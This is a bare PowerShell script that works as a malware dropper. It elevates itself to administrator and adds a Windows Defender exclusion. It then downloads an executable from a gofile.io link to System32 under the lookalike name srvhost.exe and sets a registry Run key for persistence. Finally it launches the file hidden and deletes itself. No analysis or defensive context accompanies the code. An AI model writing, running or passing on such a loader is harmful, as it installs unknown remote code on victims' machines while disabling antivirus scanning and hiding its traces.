if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}
$p = "$env:SystemRoot\System32\srvhost.exe"
Add-MpPreference -ExclusionPath $p
if (!(Test-Path $p)) { (New-Object Net.WebClient).DownloadFile('https://store-na-phx-5.gofile.io/download/web/68d2ca19-9fca-4275-a2bd-e0da3279225f/TTS.exe', $p) }
Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "srvhost" -Value 'powershell -ep Bypass -WindowStyle Hidden -Command "& \"$p\""' -Force
Start-Process $p -WindowStyle Hidden
Remove-Item $MyInvocation.MyCommand.Path -Force
